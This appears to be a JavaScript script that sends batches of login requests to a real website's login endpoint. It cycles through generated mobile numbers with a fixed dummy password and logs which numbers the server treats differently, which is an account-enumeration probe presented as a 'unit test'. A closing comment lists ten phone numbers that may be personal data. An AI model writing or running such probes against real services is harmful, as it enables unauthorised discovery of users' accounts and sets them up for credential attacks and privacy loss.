import _ from 'lodash'
import Mock from 'mockjs'
import axios from 'axios'
import qs from 'qs'
const Mobile = /^1[35789]\d{9}$/
let total = 0

/**
 * axios 公共配置
 * [1] 拦截请求
 * [2] 拦截返回
 */
axios.interceptors.request.use(config => {
  // Do something before request is sent 
  // 超时设置
  config.timeout = config.timeout || 60000

  // 调用测试环境接口
  // config.url = "https://domain" + config.url

  // 转换 post 中的 data
  config.transformRequest = [data => {
    (!!data) && (data = qs.stringify(data))
    return data
  }]

  return config
}, (error) => {
  // Do something with request error 
  return Promise.reject(error)
});

/*(async () => {
  for (let i = 0; i < 100; i ++) {
    await unit()
    console.log(`第${i}次测试完成`)
    await sleep(1000)
  }
})()*/

let mobiles = [
  '13542905998',
  '13542915998',
  '13542925998',
  '13542935998',
  '13542945998',
  '13542955998',
  '13542965998',
  '13542975998',
  '13542985998',
  '13542995998'
]
_.forEach(mobiles, item => {
  axios.post('http://rs.p5w.net/user/user/login.shtml', {
    mobileArea: '0086',
    mobile: item,
    loginPassword: 'jkkjkjskdf',
    captcha: '',
    loginType: '1',
    toTargetPage: ''
  }).then(({data}) => {
    console.log(data)
  })
})

// unit()

// ======================================= util =============================
/**
 * @Function unit 单元测试
 */
function unit () {
  let data = Mock.mock({
    'array|10': [
      {
        'mobile': /\d{4}/
      }
    ]
  })
  // let mobiles = _.map(data.array, 'mobile')
  let mobiles = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]
  // mobiles.sort((a, b) => (a - b))
  // console.log(mobiles)
  // return
  let count = 0
  // console.log(mobiles)
  return new Promise((resolve, reject) => {
    _.forEach(mobiles, item => {
      let num = '000' + total
      num = num.slice(-3)
      total++
      axios.post('http://rs.p5w.net/user/user/login.shtml', {
        mobileArea: '0086',
        mobile: `1354${num}5998`,
        loginPassword: 'jkkjkjskdf',
        captcha: '',
        loginType: '1',
        toTargetPage: ''
      }).then(({data}) => {
        let loginError = data.loginError
        if (loginError !== '-1') {
          console.log(`${item}: ${JSON.stringify(data)}`)
        } else {
          console.log(`1354${num}5998`)
        }
        if (++count === 10) {
          resolve(true)
          reject(false)
        }
      }).catch(err => console.log(`Error: ${item}`))
    })
  })
}

/**
 * @Function sleep 休息
 * @Param time Number 时间间隔 毫秒数
 * @Return Promise
 */
function sleep (time) {
  return new Promise((resolve, reject) => {
    let timer = setTimeout(() => {
      clearTimeout(timer)
      resolve(true)
      reject(false)
    }, time)
  })
}

/*15722384198
17267482257
18005878557
15663032538
15248086324
15947539141
13253860729
19281560551
15886012721
15547427756*/
